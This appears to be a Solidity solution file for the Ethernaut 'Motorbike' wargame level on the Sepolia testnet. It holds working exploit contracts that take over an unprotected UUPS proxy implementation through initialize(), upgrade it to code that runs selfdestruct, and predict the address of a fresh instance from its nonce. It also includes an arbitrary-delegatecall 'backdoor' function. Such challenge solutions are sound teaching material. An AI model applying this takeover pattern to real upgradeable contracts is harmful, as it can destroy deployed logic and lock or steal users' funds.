// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IEngine{
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
    function upgrader() external view returns (address);
}

// await web3.eth.getStorageAt(contract.address, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")
// 0x0000000000000000000000007460d6d1ac82d72fcbc43bbb42a9f459f2d7a19c
// step 0: 0x7460d6d1ac82d72fcbc43bbb42a9f459f2d7a19c
// step 1
// step 2
// but apparently we can't do that anymore
contract Hack {
    IEngine private engine;

    function step0(address target) external {
        engine = IEngine(target);
    }

    function step1() external {
        engine.initialize(); 
    }

    function step2() external {
        engine.upgradeToAndCall(address(this), abi.encodeWithSelector(this.destruct.selector));
    }

    function destruct() external {
        selfdestruct(payable(msg.sender)); 
    }
}

// Step 0 - YOU NEED A NEW FRESH INSTANCE OF THE CHALLENGE

// Step 1 - deploy that
// Deployed at 0xe16524f416Bf56A97bF9706b36C7e91564669496
contract DeadContractAddress {
    function destruct() external {
        selfdestruct(payable(msg.sender)); 
    }
}


// This is not really my solution
// I went there https://github.com/OpenZeppelin/ethernaut/issues/701 then lead to https://github.com/Ching367436/ethernaut-motorbike-solution-after-decun-upgrade/tree/main
// Now i get it why we couldn't do it, it is just mind blowing
// 

contract Engine {
    function initialize() external {}
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {}
}

// Step 2 - deploy that
// Use getNonce on 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6 - keep the value
contract AddressHelper {
    function getNonce(address _addr) public view returns (uint256 nonce) {
        for (; ; nonce = nonce + 1) {
            address contractAddress = computeCreateAddress(_addr, nonce);
            if (!isContract(contractAddress)) return nonce;
        }
    }
    function isContract(address _addr) public view returns (bool) {
        // https://ethereum.stackexchange.com/questions/15641/how-does-a-contract-find-out-if-another-address-is-a-contract
        uint32 size;
        assembly {
            size := extcodesize(_addr)
        }
        return (size > 0);
    }

    function computeCreateAddress(address deployer) external view returns (address) {
        uint256 nonce = getNonce(deployer);
        return computeCreateAddress(deployer, nonce);
    }
   
    // The code below is adapted from https://github.com/OoXooOx/Predict-smart-contract-address/blob/main/AddressPredictorCreateOpcode.sol
    function addressFromLast20Bytes(bytes32 bytesValue) private pure returns (address) {
        return address(uint160(uint256(bytesValue)));
    }

    function computeCreateAddress(address deployer, uint256 nonce) public pure returns (address) {
        // forgefmt: disable-start
        // The integer zero is treated as an empty byte string, and as a result it only has a length prefix, 0x80, computed via 0x80 + 0.
        // A one byte integer uses its own value as its length prefix, there is no additional "0x80 + length" prefix that comes before it.
        if (nonce == 0x00)      return addressFromLast20Bytes(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), deployer, bytes1(0x80))));
        if (nonce <= 0x7f)      return addressFromLast20Bytes(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), deployer, uint8(nonce))));

        // Nonces greater than 1 byte all follow a consistent encoding scheme, where each value is preceded by a prefix of 0x80 + length.
        if (nonce <= 2**8 - 1)  return addressFromLast20Bytes(keccak256(abi.encodePacked(bytes1(0xd7), bytes1(0x94), deployer, bytes1(0x81), uint8(nonce))));
        if (nonce <= 2**16 - 1) return addressFromLast20Bytes(keccak256(abi.encodePacked(bytes1(0xd8), bytes1(0x94), deployer, bytes1(0x82), uint16(nonce))));
        if (nonce <= 2**24 - 1) return addressFromLast20Bytes(keccak256(abi.encodePacked(bytes1(0xd9), bytes1(0x94), deployer, bytes1(0x83), uint24(nonce))));
        // forgefmt: disable-end

        // More details about RLP encoding can be found here: https://eth.wiki/fundamentals/rlp
        // 0xda = 0xc0 (short RLP prefix) + 0x16 (length of: 0x94 ++ proxy ++ 0x84 ++ nonce)
        // 0x94 = 0x80 + 0x14 (0x14 = the length of an address, 20 bytes, in hex)
        // 0x84 = 0x80 + 0x04 (0x04 = the bytes length of the nonce, 4 bytes, in hex)
        // We assume nobody can have a nonce large enough to require more than 32 bytes.
        return addressFromLast20Bytes(
            keccak256(abi.encodePacked(bytes1(0xda), bytes1(0x94), deployer, bytes1(0x84), uint32(nonce)))
        );
    }
}


contract MotorbikeExploit is AddressHelper {
    address public owner;
    // step 3 - change the values properly
    // address constant selfdestructContract = 0xe16524f416Bf56A97bF9706b36C7e91564669496; // what we deployed step 1
    address constant selfdestructContract = 0xA0e5F6ae6637230CCfE5d782647B673F23036763; // or use his contract
    address constant ethernaut = 0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6;
    address constant motorbikeLevel = 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6;
    address engine;
    address motorbike;

    modifier onlyOwner() {
        require(msg.sender == owner, "owner");
        _;
    }

    constructor() {
        owner = msg.sender;
        /// WEll MEH SORRY:
        // The nonce can be obtained by using `cast nonce $LEVEL -r $RPC`, where $LEVEL is the motorbike level address
        // We can also get the nonce using `getNonce(motorbikeLevel)`
        // However, since the nonce is too big, the call may be reverted.
        // The nonce is currently 3079
        /// OK SO: go on Alchemy, `https://dashboard.alchemy.com/apps/{RANDOM-ID}/networks` on a specific app of yours, on the network thing
        /// then on the Ethereum network card, you can select a network by default it's the mainnet, change to Sepolia copy that and use it as $RPC
        /// cast nonce 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6 -r https://eth-sepolia.g.alchemy.com/v2/YOU-ID-FOR-SEPILIA
        /// 4797
        /// Pray that no one is deploying a new contract, and just rushh deploying that one because otherwise you will have to restart that process
        // solve(4809);
    }

    // https://sepolia.etherscan.io/tx/0x6501dc5cbaf7e7851462bae7c675bfc8bfdda672966e446f3a377f0e1f917156
    function solve(uint256 nonce) public onlyOwner {
        createLevelInstance();

        // uint256 nonce = getNonce(motorbikeLevel);
        engine = computeCreateAddress(motorbikeLevel, nonce);
        motorbike = computeCreateAddress(motorbikeLevel, nonce+1);

        selfdestructEngine();

        // We should not submit the level within the same transaction since it uses [Address.isContract] to check if we pass. Therefore, we need to call it manually.
        // submitLevelInstance();
    }

    function createLevelInstance() public onlyOwner {
        // create a new Motorbike instance
        (bool success,) = ethernaut.call(abi.encodeWithSignature("createLevelInstance(address)", motorbikeLevel));
        require(success, "Failed to create level instance");
    }

    function submitLevelInstance() public onlyOwner {
        // submit the instance
        (bool success,) = ethernaut.call(abi.encodeWithSignature("submitLevelInstance(address)", motorbike));
        require(success, "Failed to submit level instance");
    }

    function selfdestructEngine() private {
        Engine(engine).initialize();
        /// Either do that with his contract:
        Engine(engine).upgradeToAndCall(selfdestructContract, "Ching367436"); 
        /// Do it like that with your contract:
        // Engine(engine).upgradeToAndCall(selfdestructContract, abi.encodeWithSelector(DeadContractAddress.destruct.selector));
    }

    function backdoor(address implemetation) external payable onlyOwner {
        assembly {
            let ret := delegatecall(gas(), implemetation, 0, 0, 0, 0)
        }
    }
}

/*
Discussed on the Metana slack channel:

https://x.com/colinlyguo/status/1903525924034990221
so it works with the solutions we can find on the related github issue
https://sepolia.etherscan.io/address/0x2fF98A6c8BA3c15882b14A05Bf61fc03726ad70B
which i tested myself
https://sepolia.etherscan.io/tx/0x998e878257dde108bae007fa4f5f09d3868864b7ba142cba9220c7e851bac6f9
BUT of course the UI of ethernaut won't display the ✔
https://sepolia.etherscan.io/tx/0x12140979869a8c6609f95631a895272c909557442ff23a6973f53aab8bcc68af
which is also discussed there https://github.com/OpenZeppelin/ethernaut/issues/741
*/